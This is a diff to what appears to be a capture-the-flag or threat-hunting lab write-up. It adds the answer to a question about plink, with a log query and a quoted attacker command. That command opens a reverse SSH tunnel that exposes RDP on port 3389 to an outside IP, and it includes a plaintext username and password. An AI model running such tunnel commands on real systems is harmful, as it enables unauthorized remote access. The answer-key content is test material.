@@ -158,5 +158,21 @@ From the previous answer, can see the Execution Policy is set to Bypass.<br><br>
 
 **Q21 What IP address is used when plink is executed?**<br><br>
 
+```
+ProcessEvents
+| where process_commandline contains "plink" and hostname == "UL0M-MACHINE"
+```
+<br>
+
+From the process_commandline column, we can pull the following data.
+
+```
+plink.exe -R 3389:localhost:3389 -ssh -l $had0w -pw thruthW!llS3tUfree 136.130.190.181
+```
+<br>
+The IP address is shown at the end of the line above.<br><br>
+
+**Answer: 136.130.190.181**<br><br>
+
 
 
